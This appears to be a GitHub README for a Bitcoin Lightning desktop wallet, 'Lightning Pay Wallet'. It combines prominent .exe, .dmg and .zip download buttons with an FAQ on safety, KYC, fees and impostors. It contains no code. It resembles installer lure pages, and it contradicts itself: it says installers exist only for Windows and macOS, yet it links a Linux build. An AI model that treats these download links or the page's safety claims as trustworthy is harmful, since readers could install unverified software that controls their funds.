<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What Lightning Pay Wallet is, and whether it is safe to use
A non-custodial Bitcoin Lightning wallet for Windows and macOS, with your keys on your own machine.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
Lightning Pay Wallet is a desktop Bitcoin wallet that keeps your keys on your computer and sends and receives payments over the Lightning Network. It needs no account, no server-side wallet and no identity check to run. You download it, create or import a wallet, and from then on the keys and the phrase that backs them up exist on your device, not on ours.

## What Lightning Pay Wallet is

Lightning Pay Wallet is a Bitcoin wallet for Windows and macOS that holds your keys locally and connects to the Lightning Network for fast, low-cost payments. It runs as a desktop application, keeps a twelve or twenty-four word recovery phrase, and works without an account: there is no sign-up, no server that holds your balance, and nothing to log into on a website.

Three things follow from that design, and they are what the rest of this page is about. Your keys are yours, so a backup is your responsibility and nobody can freeze your balance. There is no account, so there is nothing for a support team to reset. And because the wallet is software you install, the only copy worth running is [the current release](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1), taken from the official download page.

If you already know you want it, the platform-by-platform install walkthrough is in [installing on Windows and macOS](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-download-windows-macos.md).

## Is Lightning Pay Wallet safe and legitimate?

Lightning Pay Wallet is safe in the sense that matters for a self-custodial wallet: the code is public, the licence is open, your keys never leave your machine, and there is no company balance to freeze. It is not risk-free, and the honest version of this answer names the risks instead of promising safety.

The first risk is the one every self-custodial wallet carries. If you lose your recovery phrase and your device, nobody can restore the wallet for you. That is not a policy, it is the design: there is no server holding a copy, so there is no recovery desk to call. The seed phrase guide explains what a phrase restores and what it does not.

The second risk is the download itself. A wallet is a file people are told to trust and run, which makes wallet brands a target for fake installers; a fake download page for a well-known Lightning wallet shipped a macOS stealer in June 2026. The defence is narrow and effective: take the file from the official download page or the release page, compare the file name with the release listing before you run it, and never install a build a message, an advert or a search result offers you.

The third risk is impostors: several unrelated products use the name, and the last section shows how to tell them apart by behaviour.

## The Visa card

A Visa card is part of the Lightning Pay Wallet product: the wallet holds the Bitcoin and the card is the way to spend it where Lightning is not accepted. Card terms, limits and regional availability are set by the card issuer, so the issuer's own documentation governs what the card does in your country.

The card does not change the custody model: it spends from your wallet balance, and your phrase still backs it up. No card activation, limit increase or support conversation ever needs that phrase.

## Which platforms it runs on

The desktop wallet is built for Windows and macOS, and those are the two platforms the release page publishes installers for. Windows builds target 64-bit Windows 10 or later; macOS builds target macOS 12 or later. iOS and Android apps are part of the product family and are listed on the product site.

Install the desktop build on a desktop and the mobile app on a phone; the two are separate downloads and are not interchangeable.

## Does it require KYC?

The wallet itself requires no identity check. There is no account to open, no verification step and no place to upload a document, because there is no account system at all: the wallet is software, and the keys it manages are created on your machine.

That answer has a boundary: card and transfer features are delivered by third-party providers, and those providers run their own identity checks. The no-KYC statement describes the wallet, not the rails.

## Is it open source?

Yes. Lightning Pay Wallet is published under the MIT licence, the source is public, and the licence file carries the copyright line of its author. You can read every line that touches a key, build the app yourself, and compare what you built with what the release page distributes.

What does not yet exist publicly is a named third-party audit report. The project describes its builds as audited and signed in its own wording; treat that as the vendor's statement and give it the weight you give any vendor statement, no more. What you can verify yourself is the source, the commit history and the release assets.

## How does Lightning Pay Wallet make money?

Lightning Pay Wallet charges nothing for the wallet. There is no subscription, no account fee and no per-transaction charge from the app: the wallet is free software, and the fees you see when you send a payment are network fees paid to route it, not revenue collected by the wallet.

The commercial parts of the product sit beside the wallet, not inside it: the card, swaps and bill payments carry the fee schedule published on the product site, and each of those is a service with its own terms. Keeping the two apart matters when you compare costs, because a network fee and a service fee behave differently. The fee guide takes that comparison apart line by line.

## Bitcoin, stablecoins and other assets

Lightning Pay Wallet is a Bitcoin wallet. Its balances, its payments and its backup are Bitcoin and Lightning; there is no separate token balance and no in-wallet swap between assets. The product's pages do list multi-asset topics, so this is worth saying plainly rather than leaving to inference.

A stablecoin is a token designed to hold a steady value against a currency, usually the US dollar, and a stablecoin wallet is software that holds those tokens. That is a different product category: questions about which stablecoin to hold, or where to swap, belong to exchanges and multi-asset wallets. If holding dollars alongside bitcoin is a requirement, this wallet is not the tool.

## Taxes and records

Lightning Pay Wallet does not prepare a tax report and does not export a statement for one. What it gives you is a transaction history: the payments you made and received, with amounts and dates.

For tax purposes that history is a starting point, not a filing. Keep your own record of what each payment was for and what it was worth at the time, and check the rules where you live: treatment varies by country and by whether a payment was a purchase or a disposal.

## Which Lightning Pay is this?

Several unrelated businesses share the name, so check the behaviour rather than the name. This product is a desktop application for Windows and macOS, it asks for no account, and it is distributed as an installer you run on your own machine.

A buy-and-sell service, by contrast, asks you to open an account, verify your identity and link a bank; a payments gateway onboards merchants and issues invoices to businesses; a parking product charges for parking sessions. If what you are looking at asks for a bank login or sells you bitcoin for local currency, it is not this wallet. If it asks you to download a desktop installer and keeps your keys on your machine, it is.

## Questions people ask

### Do I need an account to use Lightning Pay Wallet?

No. The wallet creates or imports keys on your machine, and there is no account, email verification or identity step in the wallet itself. Third-party card and transfer services are separate and do their own checks.

### Is my money safe if the company disappears?

Your keys and your phrase are on your machine and in your backup, so the wallet keeps working without us. What changes is support, updates and the card service, which depend on the business continuing; the custody model is set out in [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md).

### Can I use the same phrase in another wallet?

A twelve or twenty-four word phrase follows the BIP-39 standard, so compatible wallets can import it. What it restores is your on-chain keys; Lightning channel balances need the channel backup as well, which is why the recovery guide treats the two as separate things.

### Does Lightning Pay Wallet ever ask for my seed phrase?

No. There is no screen, message or support process that needs it, and anyone who asks for it is attacking you. The product states the same rule on its own site: support never asks for a phrase and never contacts you first on a social platform.

### Can I send bitcoin to an exchange from the wallet?

Yes, to the address or invoice the exchange gives you for a deposit, provided the exchange supports the network you choose. On-chain deposits and Lightning deposits take different details, and sending the wrong kind to the wrong address is the most common way people lose money in a transfer.
